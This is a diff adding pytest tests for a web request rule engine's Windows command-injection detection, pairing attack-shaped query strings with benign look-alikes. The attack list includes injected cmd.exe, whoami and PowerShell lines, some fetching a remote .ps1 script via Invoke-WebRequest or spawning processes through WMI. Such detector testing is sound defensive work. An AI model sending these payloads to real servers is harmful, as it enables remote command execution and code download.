@@ -964,6 +964,85 @@ def test_traffic_certified_harmless_stays_quiet(engine: RuleEngine, target: str)
 
 #: Real paths from the shopfront excerpt's asset bundle, chosen because each
 #: one contains a word an action rule is interested in.
+WINDOWS_ATTACKS: list[str] = [
+    # FOR, in all four switch forms cmd.exe accepts, plus the switchless loop.
+    "/get?foo=for /f %variable in (fileset) do command",
+    "/get?foo=for /d %variable in (set) do command",
+    r"/get?foo=for /r c:\ %variable in (set) do command",
+    "/get?foo=for /l %variable in (1,1,2) do command",
+    "/get?foo=for %variable in (set) do command",
+    "/get?foo=for %%G in (a b c) do echo %%G",
+    # IF, which is three syntaxes wearing one word.
+    r"/get?foo=if /i not exist c:\nonexistent echo hey",
+    "/get?foo=if defined foo echo yes",
+    "/get?foo=if errorlevel 1 echo fail",
+    "/get?foo=if [%1]==[] echo value missing",
+    "/get?foo=if red==red echo test",
+    "/get?foo=if not red===red echo test",
+    "/get?foo=if 2 geq 15 echo bigger",
+    '/get?foo=if "2" geq "15" echo bigger',
+    "/get?foo=if (2 geq 15) echo bigger",
+    # Naming the interpreter rather than writing syntax for it.
+    "/get?cmd=cmd.exe /c dir",
+    "/get?x=%COMSPEC% /c whoami",
+    "/get?932120-1=Invoke-WebRequest http://example.com/path/file.ps1",
+    "/get?cmd=;iwr http://example.com/path/file.ps1",
+    "/get?cmd=;iwmi -class Win32_Process -name Create -ArgumentList cmd",
+    "/get?x=powershell.exe -inputformat none write 1",
+]
+
+#: Requests the CRS corpus certifies as harmless in family 932, and which every
+#: pattern in `attack/windows.yaml` was shaped around. Each one is traffic
+#: somebody reported a rule firing on, so each is a mistake already paid for by
+#: someone else.
+WINDOWS_BENIGN: list[str] = [
+    # `for` is an English word. A bare for would take this and every search
+    # box on the web with it.
+    "/get?x=find x for y",
+    # `time` is a Windows command and half a company name.
+    "/get?foo=time warner",
+    "/get?test=time express",
+    # `cmd` is the commonest parameter name there is, and this one is prose.
+    "/get?cmd=go to store. at the store, shop.",
+    # Words that contain command names without being them.
+    "/get?word=evaluation",
+    "/get?args=environment",
+    "/get?args=performance",
+    "/get?args=comment",
+    "/get?word=schedule",
+    # Brackets and globs in ordinary values.
+    "/get?page=page[1]",
+    "/get?id=does the * shine bright?",
+]
+
+
+@pytest.mark.parametrize("target", WINDOWS_ATTACKS)
+def test_windows_batch_payloads_are_caught(engine: RuleEngine, target: str) -> None:
+    """CRS family 932 sat at 9% recall until this pack existed, and 163 of the
+    368 misses were these shapes. ADR-0007 named Windows batch as the single
+    biggest hole a year before the pack was written."""
+    (labelled,) = engine.label_events([request(target)])
+
+    assert labelled.all_labels, f"nothing matched {target!r}"
+    assert any(label.category.is_hostile for label in labelled.all_labels), (
+        f"{target!r} matched only {[one.rule_id for one in labelled.all_labels]}"
+    )
+
+
+@pytest.mark.parametrize("target", WINDOWS_BENIGN)
+def test_windows_rules_stay_off_ordinary_words(engine: RuleEngine, target: str) -> None:
+    """The half that decides whether the recall above is worth anything.
+
+    Every one of these contains a Windows command name or a batch-looking
+    character and is ordinary traffic. A pack that took them would have bought
+    45% recall with a tool nobody trusts.
+    """
+    (labelled,) = engine.label_events([request(target)])
+
+    hostile = [one.rule_id for one in labelled.all_labels if one.category.is_hostile]
+    assert not hostile, f"{target!r} was called hostile by {hostile}"
+
+
 STATIC_ASSETS: list[str] = [
     "/assets/js/autocomplete.js",
     "/assets/js/cart.js",
